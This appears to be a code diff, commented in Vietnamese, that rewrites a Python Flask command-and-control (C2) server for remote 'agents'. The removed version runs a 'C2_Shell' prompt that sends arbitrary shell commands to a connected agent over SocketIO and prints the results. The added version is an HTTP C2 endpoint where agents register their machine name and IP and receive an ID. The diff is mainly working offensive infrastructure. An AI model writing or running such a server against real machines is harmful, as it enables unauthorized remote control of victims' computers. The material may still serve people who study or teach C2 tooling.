@@ -1,70 +1,50 @@
 from flask import Flask, request
-from flask_socketio import SocketIO, emit
-import threading
-import time
+import random
+import string
+import datetime
 
-# khoi tao server
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'secret!'
-socketio = SocketIO(app, cors_allowed_origins='*') # cho phep moi ket noi
 
-# bo nho quan ly agents
+# Database trong bộ nhớ (lưu tạm)
+# Cấu trúc: {'ID_CUA_AGENT': {'ip': '...', 'name': '...', 'last_seen': ...}}
 agents = {}
 
-@socketio.on('connect')
-def handle_connect():
-    print(f"[+] client connected: {request.sid}")
+def generate_id():
+    """Tạo chuỗi ID ngẫu nhiên 6 ký tự"""
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
 
-@socketio.on('disconnect')
-def handle_disconnect():
-    # tim va xoa agent da ngat ket noi khoi danh sach
-    disconnected_sid = request.sid
-    for agent_id, info in list(agents.items()):
-        if info['sid'] == disconnected_sid:
-            print(f"[-] agent disconnected: {agent_id}")
-            del agents[agent_id]
-            break
+@app.route('/')
+def index():
+    return "It works!", 200
 
-@socketio.on('register')
-def handle_register(data):
-    agent_id = data.get('agent_id')
-    agents[agent_id] = {
-        "sid": request.sid,
-        "info": data
-    }
-    print(f"[*] new agent registered: {agent_id} | sid: {request.sid}")
-
-@socketio.on('command_result')
-def handle_result(data):
-    print(f"\n[v] result from {data.get('agent_id')}:\n{data.get('output')}")
-    print("C2_Shell > ", end="", flush=True) # in lai dau nhac lenh cho dep
-
-def cmd_interface():
-    time.sleep(2) # doi server khoi dong
-    while True:
-        try:
-            if not agents:
-                print("[!] waiting for agents...", end="\r")
-                time.sleep(1)
-                continue
-
-            cmd = input("\nC2_Shell > ")
-            if not cmd: continue
-            
-            # lay agent dau tien de test
-            target_id = list(agents.keys())[0]
-            sid = agents[target_id]['sid']
-            
-            socketio.emit('execute_command', {'cmd': cmd}, room=sid)
-            print(f"[*] sent '{cmd}' to {target_id}...")
-            
-        except Exception as e:
-            print(f"[!] shell error: {e}")
+# Endpoint 1: Đăng ký (Register)
+# Agent sẽ gọi vào đây đầu tiên để báo danh
+@app.route('/reg', methods=['POST'])
+def register():
+    try:
+        # Lấy tên máy từ dữ liệu gửi lên
+        agent_name = request.form.get('name')
+        agent_ip = request.remote_addr
+        
+        # Tạo ID định danh cho Agent này
+        new_id = generate_id()
+        
+        # Lưu vào danh sách
+        agents[new_id] = {
+            "name": agent_name,
+            "ip": agent_ip,
+            "last_seen": datetime.datetime.now()
+        }
+        
+        print(f"[+] New Agent joined: {agent_name} ({agent_ip}) -> Assigned ID: {new_id}")
+        
+        # Trả ID về cho Agent nhớ
+        return new_id, 200
+    except Exception as e:
+        print(f"[-] Register error: {e}")
+        return "Error", 500
 
 if __name__ == '__main__':
-    # chay luong nhap lieu rieng
-    t = threading.Thread(target=cmd_interface, daemon=True)
-    t.start()
-    
-    print("[*] c2 server listening on port 80...")
-    socketio.run(app, port=80, debug=False, allow_unsafe_werkzeug=True)
+    print("[*] C2 Server (0xrick style) listening on port 8080...")
+    # Chạy server
+    app.run(host='0.0.0.0', port=8080)
